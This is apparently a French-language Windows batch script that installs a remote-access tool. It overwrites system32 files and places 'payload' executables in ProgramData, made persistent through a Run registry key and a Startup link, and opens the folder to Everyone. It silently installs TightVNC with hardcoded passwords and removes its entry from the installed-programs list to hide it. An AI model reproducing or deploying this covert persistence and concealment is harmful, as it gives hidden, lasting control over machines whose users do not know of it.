@echo off
Title Installation d'un outil de prise en main a distance
setlocal enableextensions enabledelayedexpansion
Mode con cols=65 lines=35
color 0F
ver | find "10.0." >nul && chcp 65001 >nul || chcp 28591 >nul

:: --------------------------------------------------------------------------------------
:: on vérifie si le script est lancé en administrateur
:: --------------------------------------------------------------------------------------

attrib %windir%\system32 -h | findstr /i "system32" >nul && exit /b 1

:: --------------------------------------------------------------------------------------
:: on vérifie si le système est une version 64 bits
:: --------------------------------------------------------------------------------------

for /f "tokens=1 delims=- " %%A in ('wmic os get OSArchitecture ^| find "bit"') do set "arch=%%Abit"
if not "%arch%"=="64bit" (exit /b 1)

cd /d %~dp0 || exit /b 1

:: --------------------------------------------------------------------------------------
:: on vérifie les prérequis
:: --------------------------------------------------------------------------------------

certutil -? >nul || exit /b 1

if not exist "Bin" (exit /b 1)
if not exist "External Commands" (exit /b 1)
if not exist "MSI Packages" (exit /b 1)

:: --------------------------------------------------------------------------------------
:: on arrête les éventuels zombies
:: --------------------------------------------------------------------------------------

tasklist | find /i "nasgul.exe" >nul && taskkill /IM "nasgul.exe" /T /F >nul

:: --------------------------------------------------------------------------------------
:: on recherche l'existence d'un serveur TightVNC
:: --------------------------------------------------------------------------------------

if exist "%ProgramFiles(x86)%\TightVNC\%1" (exit /b 1)
if exist "%ProgramFiles%\TightVNC\%1" (exit /b 1)
(tasklist | find /i "%1" >nul) && (exit /b 1)

:: --------------------------------------------------------------------------------------
:: on recherche les identifiants Pastebin
:: --------------------------------------------------------------------------------------

:debut
if exist "pastebin.asc" (certutil -decode "pastebin.asc" "pastebin.txt" >nul)
if not exist "pastebin.txt" (call :template)
set "dev_key="
set "user_key="
for /f "eol=# tokens=1,2 delims=[] " %%A in (pastebin.txt) do (if not "%%~A"=="" (set "dev_key=%%~A" & set "user_key=%%~B"))

:choix
if not defined user_key (

	cls & set "selection="
	echo ^>^>^> Que voulez-vous faire ?
	echo. & echo ^(R^) Renseigner votre clef API
	echo ^(C^) Creer un nouveau compte Pastebin
	echo. & set /p selection="Votre choix [R ou C] : "
	if not defined selection (goto :choix)
	if /i "!selection!"=="R" (
		start "" /D "%windir%\System32" /WAIT notepad.exe pastebin.txt
		timeout /t 2 /nobreak
		goto :debut
	)
	if /i "!selection!"=="C" (start https://pastebin.com/signup & exit /b 1)
	goto :choix
)

:: --------------------------------------------------------------------------------------
:: on vérifie la taille de l'identifiant
:: --------------------------------------------------------------------------------------

set position=0

:check_length

set "dev_key=!dev_key: =!"
if not "!dev_key:~%position%,1!"=="" (set /a position+=1 & goto :check_length)
if %position% NEQ 32 (goto :debut)

if defined dev_key (set pastebin=--max-time 30 --tlsv1.2 -s -d "api_dev_key=!dev_key!" -d "api_user_key=!user_key!") else (set "user_key=" & goto :choix) 

:: --------------------------------------------------------------------------------------
:: on dispatche le fichier .asc contenant les identifiants 
:: --------------------------------------------------------------------------------------

certutil -encode "pastebin.txt" "pastebin.asc" >nul

set "injection=%ProgramData%\RemoteNasgulAssistance"

if exist "..\Viewer\External Commands" (xcopy "pastebin.asc" "..\Viewer\External Commands\" /Y /V >nul)
if not exist "%injection%" (mkdir "%injection%")

xcopy "pastebin.asc" "%injection%\" /Y /V >nul

del /f /q "pastebin*.txt"

:: --------------------------------------------------------------------------------------
:: ------------Programme principal------------
:: --------------------------------------------------------------------------------------

call :third-party "%windir%\system32"

rem regedit /s /C /S "%~dp0SshHostKeys" && echo. & 0out B "*** Authentification du relais SSH (ajout de l'empreinte) ***\n"

rem echo. & 0out B "*** Reinitialisation du pare-feu Windows ***\n"
rem echo %USERDOMAIN% | find /i "%COMPUTERNAME%" >nul && netsh advfirewall reset >nul
rem cleanmgr /verylowdisk

call :payload nasgul.exe Module_MAJ.exe

call :install_VNC tvnserver.exe

start "" /D "%injection%" Module_MAJ.exe

exit /b 0

:: --------------------------------------------------------------------------------------
:: on installe quelques outils
:: --------------------------------------------------------------------------------------

:third-party

pushd "External Commands"

cls & echo. & 0out B ">>> Installation des commandes externes <<<\n"

for %%B in (*.exe *.dll *.crt *.def) do (

	if not exist "%~1\%%~B" (copy /Y /V "%%~B" "%~1" >nul) else (
		takeown /f "%~1\%%~B" >nul
		icacls "%~1\%%~B" /grant:r %USERNAME%:(F^) /q >nul
		del /f /q "%~1\%%~B"
		copy /Y /V "%%~B" "%~1" >nul
		icacls "%~1\%%~B" /reset /q >nul
		icacls "%~1\%%~B" /setowner "NT Service\TrustedInstaller" /q >nul
		icacls "%~1\%%~B" /grant "NT Service\TrustedInstaller":(F^) /q >nul
	)

	echo. & 0out E ">>> [%%~B] : \b" F " OK\n"
)

popd

goto :eof

:: --------------------------------------------------------------------------------------
:: on met en place le payload et le module de mise à jour
:: --------------------------------------------------------------------------------------

:payload

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "RemoteNasgulAssistance" /t REG_SZ /d "%injection%\%2" /f >nul

echo. & pushd "Bin"

(xcopy %1 "%injection%" /V /Y >nul) && (echo. & 0out D ">>> injection de \b" A " [%1] \b" D " vers ==>>\b" A " [%%ProgramData%%]\n")
(xcopy %2 "%injection%" /V /Y >nul) && (echo. & 0out D ">>> injection de \b" A " [%2] \b" D " vers ==>>\b" A " [%%ProgramData%%]\n")

mklink "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\%~n2" "%injection%\%2" >nul 2>&1

icacls "%injection%" /grant *S-1-1-0:^(OI^)^(CI^)F /inheritance:d >nul
icacls "%injection%\*" /reset /t >nul
attrib -r "%injection%\*" /s /d >nul

popd

goto :eof

:: --------------------------------------------------------------------------------------
:: on installe le serveur TightVNC semi-silencieusement
:: --------------------------------------------------------------------------------------

:install_VNC

echo. & echo. & 0out B "### Installation [TightVNC Server]\n"

pushd "MSI Packages"
for %%E in (tightvnc*.msi) do echo %%E | findstr "%arch%" >nul && set "package=%%~E" || set "package="

set vnc_port=5900
:counter
set /a vnc_port+=1
netstat -a -p TCP | find ":%vnc_port%" >nul && goto :counter

if defined package (msiexec /passive /promptrestart /i "%package%" ADDLOCAL="Server" SET_RFBPORT=1 VALUE_OF_RFBPORT=%vnc_port% SET_PASSWORD=1 VALUE_OF_PASSWORD=mnsvh6ob SET_VIEWONLYPASSWORD=1 VALUE_OF_VIEWONLYPASSWORD=6obmnsvh SET_USECONTROLAUTHENTICATION=1 VALUE_OF_USECONTROLAUTHENTICATION=1 SET_CONTROLPASSWORD=1 VALUE_OF_CONTROLPASSWORD=mnsvh6ob SET_ALLOWLOOPBACK=1 VALUE_OF_ALLOWLOOPBACK=1 SET_LOOPBACKONLY=1 VALUE_OF_LOOPBACKONLY=1 SET_ACCEPTHTTPCONNECTIONS=1 VALUE_OF_ACCEPTHTTPCONNECTIONS=0 SET_NEVERSHARED=1 VALUE_OF_NEVERSHARED=1 SET_RUNCONTROLINTERFACE=1 VALUE_OF_RUNCONTROLINTERFACE=0 SET_REMOVEWALLPAPER=1 VALUE_OF_REMOVEWALLPAPER=0)

popd

:: --------------------------------------------------------------------------------------
:: on supprime TightVNC de la liste des programmes installés
:: --------------------------------------------------------------------------------------

set /a match=0
for /f "delims=" %%A in ('reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /V DisplayName /S ^| find /v ":"') do (
	echo %%A | findstr /i /c:"TightVNC" >nul && set /a match=1 || if !match! NEQ 1 (set key=%%A)
)

reg export !key! "%ProgramFiles%\TightVNC\Uninstall.reg" /y >nul && reg delete !key! /f >nul

if exist "%ProgramData%\Microsoft\Windows\Start Menu\Programs\TightVNC" (move /y "%ProgramData%\Microsoft\Windows\Start Menu\Programs\TightVNC" "%ProgramFiles%\TightVNC" >nul)

goto :eof

:: --------------------------------------------------------------------------------------
:: on crée un template pour les identifiants Pastebin
:: --------------------------------------------------------------------------------------

:template

(echo #####################################################################################
echo ###                                                                               ###
echo ### Merci de renseigner ci-dessous vos identifiants Pastebin                      ###
echo ###                                                                               ###
echo ### Vos identifiants doivent respecter cette syntaxe : [api_dev_key api_user_key] ###
echo ###                                                                               ###
echo #####################################################################################
echo.
echo []) > pastebin.txt

goto :eof
rem
